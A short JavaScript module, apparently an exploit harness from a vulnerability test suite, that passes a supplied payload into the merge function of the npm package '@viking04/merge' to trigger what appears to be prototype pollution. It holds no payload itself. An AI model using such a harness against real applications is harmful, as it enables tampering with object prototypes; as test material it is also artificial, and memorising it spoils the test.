function exploitFunction(payload) {
    const merge = require("@viking04/merge");
    let a = {};
    merge(a, payload.getPayload());
}

module.exports = { exploitFunction };